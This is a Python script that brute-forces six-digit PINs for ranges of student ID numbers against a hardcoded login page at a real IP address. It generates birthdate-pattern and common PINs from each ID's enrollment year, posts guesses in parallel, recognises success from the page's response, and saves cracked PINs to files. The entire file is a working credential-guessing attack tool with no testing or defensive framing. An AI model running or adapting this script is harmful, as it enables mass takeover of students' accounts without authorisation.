#!/usr/bin/env python3.6.7

import multiprocessing  # Pool, Manager
import gc               # gc.collect
import time             # time.time
import requests         # request.post
import logging          # logging
import os               # os.remove


def init_logging():
    logFormatter = logging.Formatter(
        fmt="[%(asctime)s][%(levelname)s] %(message)s",
        datefmt='%d-%b-%y %H:%M:%S')

    rootLogger = logging.getLogger()

    fileHandler = logging.FileHandler("log.txt", mode='a')
    fileHandler.setFormatter(logFormatter)
    rootLogger.addHandler(fileHandler)

    consoleHandler = logging.StreamHandler()
    consoleHandler.setFormatter(logFormatter)
    rootLogger.addHandler(consoleHandler)

    rootLogger.setLevel(logging.INFO)


def init_dictionary(nim="160000000"):
    nim = str(nim)
    start_year = int(nim[:2]) + 81
    end_year = int(nim[:2]) + 83

    start_time = time.time()
    dictionary = []
    for yy in range(start_year, end_year+1):
        for mm in range(1, 13):
            for dd in range(1, 32):
                if mm == 2 and dd > 29:
                    continue
                if mm in [2, 4, 6, 9, 11] and dd > 30:
                    continue
                dictionary.append(str(dd).zfill(2)
                                  + str(mm).zfill(2)
                                  + str(yy).zfill(2)[-2:])
                dictionary.append(str(yy).zfill(2)[-2:]
                                  + str(mm).zfill(2)
                                  + str(dd).zfill(2))
    for n in range(0, 1000):
        t = str(n)
        dictionary.append(t * int(6 / len(t)))

    # put extra values here
    dictionary += [
        "123456",
        "654321",
    ]
    dictionary = list(set(dictionary))
    total_time = time.time()-start_time

    logging.debug("Dictionary generated {} values in {:0.2f}s for {}"
                  .format(len(dictionary), total_time, nim))
    return dictionary


def login(nim, pin, found, counter, depth=0):
    """Login into specified URL inside this function.
    Please edit the target and success message
    in this function declarataion as needed
    """
    URL = "http://180.250.7.188/load_login.php"
    OK_TXT = """<script language="JavaScript1.2">document.getElementById('usern').style.backgroundColor='#F3F3F3';document.getElementById('passw').style.backgroundColor='#F3F3F3'</script><div id="divTarget">Success </div><script language="javascript">window.location ='/reg/'</script>"""
    MAX_RETRY = 4   # please edit this if you need more retry

    if not found.value:
        try:
            with requests.Session() as s:
                data = {"usern": nim, "passw": pin}
                r = s.post(URL, data=data).text
            if r == OK_TXT:
                found.value = True
                return pin
        except (requests.ConnectTimeout, requests.ConnectionError):
            logging.warning(
                'Connection Problem occured, {} of {} retries'.format(depth, MAX_RETRY))
            if depth < MAX_RETRY:
                depth += 1
                return login(nim, pin, found, counter, depth)
        finally:
            counter.value += 1


def brute(nim, process_count):
    start_time = time.time()
    logging.info('Start bruteforce for {} '.format(nim))
    found = multiprocessing.Manager().Value('I', 0)
    counter = multiprocessing.Manager().Value('I', 0)

    # check saved pin first
    try:
        filename = 'found/{}'.format(nim)
        with open(filename, 'r') as f:
            pin = f.read()
            logging.info('Saved pin found for {}, trying it.'.format(nim))
    except FileNotFoundError:
        pass
    else:
        result = login(nim, pin, found, counter)
        if result == pin:
            logging.info('Saved pin is good.')
            return
        else:
            logging.warning('Saved pin is bad, trying normal method.')
            os.remove(filename)

    dictionary = init_dictionary(nim)
    with multiprocessing.Pool(process_count) as pool:
        result = list(pool.starmap(
            login, [[nim, pin, found, counter] for pin in dictionary]))

    result = list(set(result))
    result.remove(None)
    total_time = time.time() - start_time

    if len(result) == 1:
        with open('found/{}'.format(nim), 'w') as logfile:
            logfile.write(result[0])
            logging.info('Found %s %s' % (nim, result[0]))
    else:
        logging.info('Failed %s' % (nim))
    logging.info("Finished %s in %.2fs" % (nim, total_time))


def parse_argument():
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument("--retry",
                        metavar="N",
                        default=4,
                        type=int,
                        help="number of max retry if exception occured, default is 4")
    parser.add_argument("--infile",
                        metavar="PATH",
                        help="txt file containing targets to bruteforce")
    parser.add_argument("--outfile",
                        metavar="PATH",
                        default="temp.txt",
                        help="txt file to write if not all target is tried default is temp.txt")
    parser.add_argument("--target",
                        metavar="TARGET",
                        type=int,
                        help="target NIM to bruteforce",
                        nargs="+")
    parser.add_argument("--range",
                        metavar=("START", "END"),
                        type=int,
                        nargs=2,
                        help="range of target NIM to bruteforce, END is included in the range")
    parser.add_argument('-p', '--process',
                        metavar="N",
                        type=int,
                        default=multiprocessing.cpu_count(),
                        help="Specify number of process to use, default value is CPU Count. It's more limiting to RAM than CPU, use with CAUTION!!!")
    return parser.parse_args()


def main():
    init_logging()
    args = parse_argument()

    # parse and gather all target
    target = []
    done = []
    if args.infile:
        try:
            with open(args.infile, 'r') as filetarget:
                target += filetarget.read().split('\n')
        except FileNotFoundError:
            logging.warning('Input file not found.')
    if args.target:
        target += args.target
    if args.range:
        target += [n for n in range(args.range[0], args.range[1]+1)]
    if target == []:
        logging.critical('Target is empty!')
        exit(1)

    logging.info("Starting bruteforce with {} process(es) for {} target(s)".format(
        args.process, len(target)))

    try:
        for nim in target:
            brute(nim=nim, process_count=args.process)
            done.append(nim)
            gc.collect()
    except KeyboardInterrupt:
        logging.info('Interrupted by user input')
    except Exception as ex:
        logging.exception('Exception occured: {}'.format(str(ex)))
    finally:
        if not len(done) == len(target):
            logging.info(
                'Program terminated prematurely. Writing remaining target to temp.txt')
            with open(args.outfile, 'w') as outfile:
                outfile.write('\n'.join([str(t)
                                        for t in target if t not in done]))


if __name__ == '__main__':
    main()
